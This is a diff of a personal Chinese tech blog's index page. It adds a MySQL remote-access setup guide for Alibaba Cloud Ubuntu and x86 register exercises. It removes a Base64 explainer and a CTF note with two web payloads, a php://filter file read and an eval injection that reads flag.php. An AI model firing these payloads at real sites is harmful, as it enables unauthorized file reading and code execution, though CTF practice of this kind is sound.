@@ -191,6 +191,147 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-阿里云Ubuntu上安装mysql并运行" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/06/25/阿里云Ubuntu上安装mysql并运行/" class="article-date">
+  	<time datetime="2020-06-25T07:33:53.951Z" itemprop="datePublished">2020-06-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/25/阿里云Ubuntu上安装mysql并运行/">
+        阿里云+Ubuntu+Mysql
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>整个过程虽然不是很复杂，但是在这个过程中所学到的知识以及对自己的反思感觉还是有必要记录一下的。
+</code></pre><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><pre><code>对于mysql 在linux系统上的安装过程，在自己的[CSDN博客](https://blog.csdn.net/qq_39536716/article/details/106906228) 中已经有所总结与介绍，比较简单这里就不多说了，到此为止在linux上登陆并使用mysql是没有什么问题了。主要是聊一聊下面的过程。
+</code></pre><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><pre><code>我们在进行远程连接的时候，一般Linux上都有防火墙设置，阻止外界直接访问系统端口。
+</code></pre><p>1、可以通过测试：<br>    telnet xxx.xxx.xxx.xxx 端口号<br>    进行测试。<br>这时候我们可以发现telnet 是不通过的，3306端口拒绝访问。<br>2、在linux界面进行端口监测，查看3306端口是否已经开启访问:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw status</span><br></pre></td></tr></table></figure>
+<p>这行命令显示出系统已经开启的端口访问。<br>如果显示有3306 端口 ALLOW 表示防火墙允许远程主机访问。</p>
+<p>3、如果未显示上述结果，则需要开放防火墙端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 3306</span><br></pre></td></tr></table></figure>
+<p>然后在查看防火墙的端口设置，最后重启防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw reload</span><br></pre></td></tr></table></figure>
+<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>经过上述配置之后，我们远程电脑与linux 系统的3306端口已经打开第一道防线，一般mysql 的配置中还会对3306端口进行监听。<br>    我们通过下面的命令来查看是否有监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep 3306</span><br></pre></td></tr></table></figure>
+<p>如果结果中有对127.0.0.1 的监听，表示3306这个端口目前只能被本机使用，因此我们就要修改一下mysql的配置文件。<br>这一部分在网上查的是在/etc/mysql/my.cnf ，此时我们可以进去可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!includedir /etc/mysql/conf.d/</span><br><span class="line">!includedir /etc/mysql/mysql.conf.d/</span><br></pre></td></tr></table></figure>
+<p>这个文件的意思是表示包含/etc/mysql/conf.d/这个路径下面的配置文件，前提是必须以.cnf为后缀，第二行同理；<br>在这个配置文件这里花费的时间是最长的，因为在找bind-address 的时候花费的时间是最多的。当理解上面的两行命令之后，就可以直接去到conf.d 与 mysql.conf.d中去找，这两个文件夹里面依旧是有配置文件的。</p>
+<p>网上对这两个配置文件的描述大多数也比较模糊，通过vim查看刚开始没有找到，注意我这里是直接通过眼睛观察的（有点可笑），并且在查看mysqld.cnf的时候没有发现bind-address这个关键字（具体的原因是因为我没有进行翻页，这是后来才发现的）。苦苦找了一个多小时，无果。<br>于是死马当作活马医，就使用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/mysql.conf.d/mysqld.cnf | grep bind-address</span><br></pre></td></tr></table></figure>
+<p>没想到奇迹发生了 找到了bind-address<br>这时候才想起来 翻页这回事（有点傻了）<br>此时注释掉 bind-address 即可。<br>重启mysql</p>
+<h1 id="阿里云客户端配置"><a href="#阿里云客户端配置" class="headerlink" title="阿里云客户端配置"></a>阿里云客户端配置</h1><p>这时候linux上的所有配置以为全部结束，便开始远程登陆，难受的事情又发生了，在一个陌生的ip地址处，拒绝了访问。真是有点小苦恼了。拒绝访问，肯定是在数据请求的过程中又有拦截，之前配置过8080端口，于是就去尝试了一下在阿里云客户端处设置3306的可访问操作。<br>这里在客户端的安全组中就可以添加。</p>
+<h1 id="创建远程连接"><a href="#创建远程连接" class="headerlink" title="创建远程连接"></a>创建远程连接</h1><p>一切全部配置好了，这时候以为终于可以安全的远程登陆mysql了，没想到意外又发生了（想哭）<br>远程登陆显示ERROR 1130 （HY000） Host ‘xxxxx’ is not allowed to connect to this Mysql server.<br>一个陌生的错误出现了，于是在网上查了查这个错误的原因。<br>这个错误是典型的远程权限问题，远程电脑没有足够的权限对linux上的软件进行访问，于是是需要登陆mysql进行创建一个远程登陆用的账户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all PRIVILEGES on db_name.* to &apos;username&apos;@&apos;xxx.xxx.xx.x&apos; identified by &apos;password&apos; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>
+<p>这里的xxx 表示可以远程访问的ip地址，为了能够访问的时候方便一下，我们尽量在设置自己主机IP的时候，不要使用动态连接池。<br>或者 我们也可以把xxx用% 替代，这时候就表示所有ip的主机都可以进行访问。不过这样数据的安全性就很大的降低了。<br>最后，为了让我们的配置生效，我们需要执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH   PRIVILEGES;</span><br></pre></td></tr></table></figure>
+<p>至此，我们就可以成功的连接了。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2020/06/25/阿里云Ubuntu上安装mysql并运行/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="阿里云+Ubuntu+Mysql">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-寄存器（内存访问03）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/09/寄存器（内存访问03）/" class="article-date">
+  	<time datetime="2019-05-09T01:17:54.503Z" itemprop="datePublished">2019-05-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="题目01（单步跟踪）"><a href="#题目01（单步跟踪）" class="headerlink" title="题目01（单步跟踪）"></a>题目01（单步跟踪）</h2><p>内存中的情况如下图，写出下面指令执行后的寄存器ax,bx,cx中的值<br><img src="https://img-blog.csdnimg.cn/2019050608393421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NTM2NzE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ax  = 1123<br>bx  = 8833<br>cx = 8833</p>
+<h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><ol>
+<li>存放值<br><img src="https://img-blog.csdnimg.cn/20190506085251104.png" alt="在这里插入图片描述"><br>-e 1000:0 23 11 22 11<br>-r  指令用来显示内存中各个值的情况<br>-a 1386:100</li>
+</ol>
+<p>-t 为单步跟踪</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2019/05/09/寄存器（内存访问03）/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title>
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-寄存器（内存控制04）" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -795,163 +936,9 @@
 
 
   
-    <article id="post-Base家族" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/04/29/Base家族/" class="article-date">
-  	<time datetime="2019-04-29T08:53:02.644Z" itemprop="datePublished">2019-04-29</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/29/Base家族/">
-        Base家族
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式</p>
-<p>base64编码是用64（2的6次方）个字符，对二进制数据进行编码的方式</p>
-<p>base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式</p>
-<p>base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式</p>
-<p>1.Base64简介</p>
-<p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。base64编码一般有下面两个用途：</p>
-<p>a）所有的二进制文件，都可以因此转化为可打印的文本编码（都变成ASCII码可打印字符），使用文本软件进行编辑；</p>
-<p>b）能够对文本进行简单的加密。</p>
-<p>说白了，一段由0和1组成的串或文件，都能按照base64的编码规则转换成一段由64个字符任意组合的串。</p>
-<p>2.Base64编码规则</p>
-<p>所谓Base64，就是说选出64个字符—-小写字母a-z、大写字母A-Z、数字0-9、符号”+”、”/“（再加上作为垫字的”=”，实际上是65个字符）—-作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。</p>
-<p>具体来说，转换方式可以分为四步：</p>
-<p>第一步，将每三个字节作为一组，一共是24个二进制位<br>第二步，将这24个二进制位分为四组，每个组有6个二进制位<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节<br>第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值<br><img src="https://img-blog.csdnimg.cn/2019042615545487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NTM2NzE2,size_16,color_FFFFFF,t_70" alt="Base64索引表"><img src="https://img-blog.csdnimg.cn/20190426155622408.png" alt="在这里插入图片描述"><br>备注：</p>
-<p>（1）Base64将三个字节转化成四个字节，因此Base64编码后的文本，会比原文本大出三分之一左右</p>
-<p>（2）对于不满3个字节的东东，就需要加上base64编码中的垫字符来补充</p>
-<p>（3）Base64编码是可逆的，所以有Base64编码encode和解码decode</p>
-<p>（4）Base64主要不是加密，它主要的用途是把一些二进制数转成普通字符用于网络传输（因为一些二进制字符在传输协议中属于控制字符，不能直接传送）。另外，还有一些系统中只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法。base64其实不是安全领域下的加密解密算法。虽然有时候经常看到所谓的base64加密解密。其实base64只能算是一个编码算法，对数据内容进行编码来适合传输。虽然base64编码过后原文也变成不能看到的字符格式，但是这种方式很初级，很简单。</p>
-<p>4.Base32和Base16</p>
-<p>在Base家族中还有Base32和Base16，其实Base32/Base16和Base64目的是一样的，只是具体的编码规则的不一样罢了。Base32编码将二进制文件转换成由32个ASCII字符组成的文本；Base16编码则将二进制文件转换成由16个字符组成的文本</p>
-<p><img src="https://img-blog.csdnimg.cn/20190426155708201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NTM2NzE2,size_16,color_FFFFFF,t_70" alt="Base32"><img src="https://img-blog.csdnimg.cn/20190426155729853.png" alt="Base16"><br>总结：以后见到有一串固定的字符串，和‘=’以及算法中有rol eax ，5等字样要想起来这个是base32的算法。<br>解题方式：base64+base32+base16+ascii码多次解码</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2019/04/29/Base家族/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="Base家族">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-File Include" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/04/26/File Include/" class="article-date">
-  	<time datetime="2019-04-26T03:47:30.364Z" itemprop="datePublished">2019-04-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/04/26/File Include/">
-        File include
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="文件包含类型的题目"><a href="#文件包含类型的题目" class="headerlink" title="文件包含类型的题目"></a>文件包含类型的题目</h1><p><a href="https://www.jianshu.com/p/6af8e76d22a5" target="_blank" rel="noopener">学习网址</a></p>
-<h2 id="文件包含-150-解题方式"><a href="#文件包含-150-解题方式" class="headerlink" title="文件包含 150 解题方式"></a>文件包含 150 解题方式</h2><ul>
-<li>使用php://filter协议读取index文件</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</span><br></pre></td></tr></table></figure>
-<p>需要对file后面的内容做一些修改</p>
-<h2 id="本地包含-60-解题方式"><a href="#本地包含-60-解题方式" class="headerlink" title="本地包含 60 解题方式"></a>本地包含 60 解题方式</h2><p>拼接eval构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://123.206.87.240:8003/?hello=);print_r(file(&quot;./flag.php&quot;));//</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2019/04/26/File Include/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="File include">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 </div>
